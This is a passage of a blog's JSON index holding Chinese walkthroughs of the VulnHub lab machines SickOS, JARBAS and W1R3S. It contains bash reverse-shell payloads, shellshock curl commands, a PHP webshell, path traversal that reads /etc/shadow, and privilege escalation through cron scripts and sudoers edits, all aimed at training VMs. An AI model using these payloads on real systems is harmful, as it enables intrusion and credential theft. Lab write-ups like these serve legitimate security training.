成功获得root权限","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"SickOS","slug":"SickOS","date":"2023-03-14T16:51:15.000Z","updated":"2023-04-18T06:34:09.130Z","comments":true,"path":"2023/03/15/SickOS/","link":"","permalink":"http://ljx-go.top/2023/03/15/SickOS/","excerpt":"","text":"描述12345678ABOUT RELEASEName........: SickOs1.1Date Release: 11 Dec 2015Author......: D4rkSeries......: SickOsObjective...: Get /root/a0216ea4d51874464078c618298b1367.txtTester(s)...: h1tch1Twitter.....: https://twitter.com/D4rk36 信息收集主机发现IP地址 192.168.37.140 nmap扫描 发现端口22 3128 8080 其中8080端口未开启 经过两次nmap漏洞扫描并未发现其他信息 访问3128端口与8080端口结果如下 结果都显示3128端口的服务框架为squid，上网搜寻squid的相关信息 Squid cache（简称为Squid）是一个流行的自由软件（GNU通用公共许可证）的代理服务器和Web缓存服务器。Squid有广泛的用途，从作为网页服务器的前置cache服务器缓存相关请求来提高Web服务器的速度，到为一组人共享网络资源而缓存万维网，域名系统和其他网络搜索，到通过过滤流量帮助网络 安全，到局域网通过DL上网。Squid主要设计用于在Unix一类系统运行。 在此猜测，访问80端口须走3128端口代理 Squid代理设置通过这个思路 我们可以对靶机进行目录爆破 在爆破的同时加入代理服务器 通过浏览器访问前设置proxy代理 Web服务访问robots.txt 访问&#x2F;wolfcms目录 通过谷歌关键词搜索后台登陆地址 成功访问后台登陆地址，是一个登陆界面。面对该登陆界面有以下三种思路 1.弱密码 2.默认账号 3.暴力破解 经过弱密码尝试后，用 admin/admin成功登陆 发现有很多文件内容都是用php脚本来执行，同时也存在文件上传的入口 尝试在Articles中插入一句话木马。 &lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&#39;&quot;);?&gt; 在点击Articles时成功反弹shell 提权查看网站配置文件config.php 获得数据库账号密码 root/john@123 查看&#x2F;etc&#x2F;passwd文件，获得靶机的相关用户及其权限 尝试用着数据库的账号密码 对靶机ssh连接 成功ssh连接获得sickos账户 方法二利用Nikto 发现shellshock漏洞 Nikto详细使用教程 nikto常用命令-upodate 升级，更新插件 -host 扫描目标URl -id username:password http认证接口 -list-plugins 列出所有可用的插件 -evasion IDS&#x2F;IPS逃避技术（实例演示里有详细信息） -port 指定端口（默认80） -ssl 使用SSL -useproxy 使用http代理 -vhost 域名 当一个IP拥有多个网站时 使用 nikto交互参数（扫描过程中使用）空格 报告当前扫描状态 v 显示详细信息 d 显示调试信息 e 显示http错误信息 p 显示扫描进度 r 显示重定向信息 c 显示cookie a 显示身份认证过程 q 退出程序 N 扫描下一个目标 P 暂停扫描 nikto -h 192.168.37.140 -useproxy 192.168.37.140:3128 注意此处需要挂代理 漏洞原因 bash使用的环境变量是通过函数名称来调用的，以”()&#123;“开头通过环境变量来定义，而在处理这样的恶意的函数环境变量时，并没有以函数结尾 “&#125;” 为结束，而是执行其后的恶意shell命令 检查漏洞 curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :;&#125;;echo;/usr/bin/whoami&quot; http://192.168.37.140/cgi-bin/status 反弹shell curl --proxy http://192.168.37.140:3128 -v -A &quot;() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1&quot; http://192.168.37.140//cgi-bin/status 小tips 当获得的shell的交互性比较差可以用使用 python 的 pty 来转换为 交互式shell python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 查看网站根目录文件 通过查看定时任务cron提权 在过滤关键字cron中获得多个定时任务有关的文件夹，其中在cron.d中的automate中发现存在一个定时任务每个一分钟执行网站根目录下的python文件，因此可以通过执行python脚本来反弹shell，进一步提权 使用msfvenom生成shell msfvenom参数简介 利用msfvenom制作木马，并且反弹shell msfvenom -p cmd/unix/reverse_python LHOST=192.168.37.135 LPORT=7778 -f raw 成功获得目标！！！","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"JARBAS","slug":"JARBAS","date":"2023-03-11T15:40:15.000Z","updated":"2023-04-18T06:30:31.461Z","comments":true,"path":"2023/03/11/JARBAS/","link":"","permalink":"http://ljx-go.top/2023/03/11/JARBAS/","excerpt":"","text":"靶场介绍靶机名：JARBAS Jarbas靶场下载地址: https://download.vulnhub.com/jarbas/Jarbas.zip 信息收集主机发现靶机IP地址 192.168.37.139 nmap扫描nmap --min-rate 10000 -p- 192.168.37.139 两次扫描有不同的结果 因此我们尽量在扫描时重复一次 防止端口漏扫 查询端口服务对应的版本 nmap -sT -sV -O -p22,80,3306,8080 192.168.37.139 nmap -sU -p22,80,3306,8080 192.168.37.139 nmap漏洞扫描 nmap --script=vuln -p22,80,3306,8080 192.168.37.139 在80端口中发现潜在的目录列表 &#x2F;icons 在8080端口中发现&#x2F;robots.txt文件 访问80端口web服务 访问8080端口 疑似后台登陆账密 目录扫描dirsearch -u 192.168.37.139 -x 403 访问access.html 一眼md5加密 解密得到 对应的数据如下 user passwd tiago italia99 trindade vipsu eder marianna 用于8080端口登陆，在经过上述对应账密登陆失败后，通过打乱搭配尝试登陆 最终eder vipsu 登陆 （此处由于数据内容较少没有bp，当数据过多时则需要用bp快速找出正确账号密码） Getshell 在New Item处可以创建一个新项目 尝试创建一个名为test1的项目，在设置项目时看到Build选项中存在Execute shell 此处我们可以通过bash getshell getshell语句为：/bin/bash -i &gt;&amp; /dev/tcp/192.168.37.135/7777 0&gt;&amp;1 命令 命令详解 bash -i 产生一个bash交互环境。 &gt;&amp; 将联合符号前面的内容与后面相结合，然后一起重定向给后者。 &#x2F;dev&#x2F;tcp&#x2F;192.168.37.135&#x2F;7777 Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机192.168.37.135的7777端口建立一个tcp连接。 0&gt;&amp;1 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 Bash反弹一句完整的解读过程就是： Bash产生了一个交互环境和本地主机主动发起与攻击机7777端口建立的连接（即TCP 7777会话连接）相结合，然后在重定向个TCP 7777会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。 攻击机本地监听7777端口 成功连接 提权查询shell的权限 sudo -l 无任何权限，需要提权 查询定时任务 定时任务（cron job）被用于安排那些需要被周期性执行的命令。利用它，你可以配置某些命令或者脚本，让它们在某个设定的时间内周期性地运行。cron 是 Linux 或者类 Unix 系统中最为实用的工具之一。cron 服务（守护进程）在系统后台运行，并且会持续地检查 /etc/crontab 文件和 /etc/cron.*/ 目录。它同样也会检查 &#x2F;var&#x2F;spool&#x2F;cron&#x2F; 目录。 存在一个定时任务 任务解释：每5分钟以root权限执行&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh ，执行的结果将被丢弃 脚本内容如下 方法一 将getshell payload 写入&#x2F;etc&#x2F;script&#x2F;CleaningScript.sh 同时监听7776端口待执行后可以获得root权限 方法二 修改CleaningScript.sh内容，使它能够修改sudoers，给予jenkins免密码执行sudo的权限。并利用crontab定时执行该任务echo &quot;echo &#39;jenkins ALL=(ALL) NOPASSWD:ALL&#39; &gt;&gt; /etc/sudoers&quot; &gt;&gt; /etc/script/CleaningScript.sh sudoers用来保存一些用户，使这些用户可以通过sudo命令来暂时获取root的权限 成功获得root权限","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]},{"title":"W1R3S","slug":"W1R3S","date":"2023-03-10T13:11:15.000Z","updated":"2023-04-18T04:38:16.152Z","comments":true,"path":"2023/03/10/W1R3S/","link":"","permalink":"http://ljx-go.top/2023/03/10/W1R3S/","excerpt":"","text":"靶场介绍靶机名：W1R3S 靶机地址：https://www.vulnhub.com/entry/w1r3s-101,220/ 下载地址：下载（镜像）：https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip 描述：你被雇来对W1R3S做渗透测试。公司个人服务器并报告所有发现。他们要求您获得root权限并找到标志(位于&#x2F;root目录中)。 目标：得到root权限&amp;找到flag.txt 信息收集1.主机发现 开启靶机后用nmap扫描发现靶机ip sudo nmap -sn 192.168.37.0/24 （不知道具体ip可以通过关闭靶机前后分别扫描） ip地址为 192.168.37.137 2.端口扫描 sudo nmap --min-rate 10000 -p- 192.168.37.137 设置–min-rate参数确保扫得全and准确 识别端口相关信息 sudo nmap -sT -sV -O -p21,22,80,3306 192.168.37.137 -sT用TCP协议 -sV获得对应服务的版本信息 -O获得主机信息 sudo nmap -sU -p21,22,80,3306 192.168.37.137 -sU用udp协议 (往往开发人员忽略了UDP协议) 4个端口侧重点：80&gt;21&gt;3306&gt;22 其中ssh服务 一般是通过暴力破解password 所以为最不可能一项 sudo nmap --script=vuln -p21,22,80,3306 192.168.37.137 利用nmap自带的漏洞扫描对端口进行扫描 从结果得知21 22端口没有信息 80端口中web服务框架为wordpress 是重点突破的地方 MAC地址显示VMware 如果是在真实环境中获得的，宿主环境很可能是window系统 ftp测试ftp是否允许匿名登陆FTP（匿名登录）未授权访问漏洞 FTP的匿名登录一般有三种：1、 用户名：anonymous 密码：Email或者为空2、 用户名：FTP 密码：FTP或者为空3、 用户名：USER 密码：pass 成功匿名登陆 注！！！ ftp登陆后 需要输入binary切换一下 原因ftp 默认为ascii获取文件内容，当获取的文件为可执行文件时，不输入binary则可能会损坏可执行文件 ftp文件下载命令 wget +文件名 其中 employee-names.txt涉及一些敏感信息泄露 可能对于后续有用 Web服务访问页面 前面得知它是一个wordpress框架，通过目录爆破获得对应框架的路径 目录爆破利用feroxbuster及kali自带字典进行爆破 路径：/usr/share/seclists/ kali系统自带字典wordlists简介 feroxbuster -u http://192.168.37.137 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 扫描结果 其中wordpress 与 administrator目录 Cuppa CMS先访问http://192.168.37.137/administrator 获得一个CMS安装界面 点击next后出现注册信息 随意填写再次点击next后安装失败 提示没有Administrator权限 此路不通 用searchsploit搜索cuppa cms相关漏洞 【网安神器篇】——searchsploit漏洞利用搜索工具 查询到相关漏洞描述文件 并用-m参数将一个漏洞利用镜像（副本）到当前工作目录(后面跟漏洞ID号) get传参访问 没有结果 由于$_REQUEST可以用post传参 所以用curl尝试post传参 curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.37.137/administrator/alerts/alertConfigField.php 成功获得&#x2F;etc&#x2F;passwd内容 Linux &#x2F;etc&#x2F;passwd内容解释 尝试查看&#x2F;etc&#x2F;shadow文件 Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细） curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.37.137/administrator/alerts/alertConfigField.php 将&#x2F;etc&#x2F;shadow中三个较长的信息收集在一个txt文件内 用john破解 获得其中两个用户的账号密码，很明显可以看出w1r3s权限更高些 利用账号密码ssh远程登陆 成功getshell 查询权限 sudo -l 显示了允许当前用户使用的命令 利用sudo提权 sudo /bin/bash 获得flag.txt 结束本次靶机的练习","categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]}],"categories":[],"tags":[{"name":"vulnhub靶机","slug":"vulnhub靶机","permalink":"http://ljx-go.top/tags/vulnhub%E9%9D%B6%E6%9C%BA/"}]}